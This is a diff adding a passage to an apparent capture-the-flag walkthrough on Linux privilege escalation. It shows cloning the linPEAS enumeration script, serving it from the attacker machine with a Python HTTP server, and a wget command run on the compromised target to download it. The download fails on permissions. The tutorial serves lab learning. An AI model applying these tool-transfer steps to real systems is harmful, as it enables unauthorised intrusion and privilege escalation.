@@ -3023,7 +3023,10 @@ bash: cd: /root: Permission denied
 ```
 
 <p></p>
-Its never that easy, so we will move onto the Privilege Escalation (priv esc) stage of this box. The first thing you should always try is this command:
+Its never that easy, so we will move onto the Privilege Escalation (priv esc) stage of this box. (If you dont already have <a href="https://book.hacktricks.xyz/" rel="nofollow">HackTricks</a> bookmarked you need to go and do that now, It has a specific <a href="https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist" rel="nofollow">page</a> on linux priv esc which comes with a checklist and you can visit his <a href="https://github.com/carlospolop/hacktricks/tree/master/linux-unix/privilege-escalation" rel="nofollow">GitHub</a> page for the commands to run. This way of priv esc is manual so you search each item until you find the exploitable route to escalate, however I will show you an awesome script that will enumerate the system for us!)
+
+<p></p>
+The first thing you should always try is this command:
 <p></p>
 
 ```
@@ -3043,6 +3046,89 @@ Sorry, user robot may not run sudo on linux.
 ```
 
 <p></p>
+Now there is a very quick one line command to find out how to priv esc straight away (remember that hacktricks site), but getting root that quick wouldn't teach us that much so I will save that one for later.
+<p></p>
+To start with I will go over system enumeration, so we can cover starting a local server, pulling a file onto the target machine using 2 different methods and running the script.
+<p></p>
+To carry out this enumeration we are going to use a script called linPEAS.sh. This is an essential tool to have in your arsenel and knowing how to get it onto a target system is pivital... to start with you need to get the script, which you can get by running the following command:
+<p></p>
+
+```
+git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite.git
+```
+
+<p></p>
+Which outputs:
+<p></p>
+
+```
+❯ git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite.git
+Cloning into 'privilege-escalation-awesome-scripts-suite'...
+remote: Enumerating objects: 6225, done.
+remote: Counting objects: 100% (993/993), done.
+remote: Compressing objects: 100% (252/252), done.
+remote: Total 6225 (delta 774), reused 842 (delta 726), pack-reused 5232
+Receiving objects: 100% (6225/6225), 33.76 MiB | 11.98 MiB/s, done.
+Resolving deltas: 100% (3687/3687), done.
+```
+
+<p></p>
+So we have our enumeration script but how do we get it onto our target VM? First we need to navigate into the directory that holds linpeas.sh and then we will start up a http server. To do this we use this command (it has to be run in the directory that holds the file we want to serve!):
+<p></p>
+
+```
+python -m http.server 8080
+```
+
+<p></p>
+In this command we are using python to call a module using the <kbd>-m</kbd> flag and the module we are going to use is the http.server module, then all we need to do is give the server a port to serve on, 8080 in this case (alot of the time it is good to use common ports ie. 80,443,8080 as these are rarely blocked by firewalls). This command outputs the following:
+<p></p>
+
+```
+❯ python -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+```
+
+<p></p>
+Great so our server is up, we can leave it be now as everything further is carried out on the target VM.
+<p></p>
+Switching to our target VM we need to pull that linpeas.sh file across we do this using one of two commands, being wget or curl (its good to know how to use both of these commands for this task as occasionally one will be blocked on the system). We will start with wget the command we are going to use is:
+<p></p>
+
+```
+wget http://192.168.125.134:8080/linpeas.sh
+```
+
+<p></p>
+In this command we direct wget to our ip address followed by the port we started our server on and finall  a '/' followed by the file we wish to pull accross. This command outputs:
+<p></p>
+
+```
+robot@linux:~$ wget http://192.168.125.134:8080/linpeas.sh
+wget http://192.168.125.134:8080/linpeas.sh
+--2021-07-10 00:50:04--  http://192.168.125.134:8080/linpeas.sh
+Connecting to 192.168.125.134:8080... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 462687 (452K) [text/x-sh]
+linpeas.sh: Permission denied
+
+Cannot write to ‘linpeas.sh’ (Permission denied).
+```
+
+<p></p>
+We were denied! But why? Well that can be answered by looking at the permissions of the robot home folder.
+<p></p>
+
+```
+robot@linux:/home$ ls -l
+ls -l
+total 4
+drwxr-xr-x 2 root root 4096 Nov 13  2015 robot
+```
+
+<p></p>
+Looking at the file permissions of the robot folder we see a bunch of letters at the start d=directory, r=read, w=write and x=execute, this is broken into 3 sections.
+
 
 
 
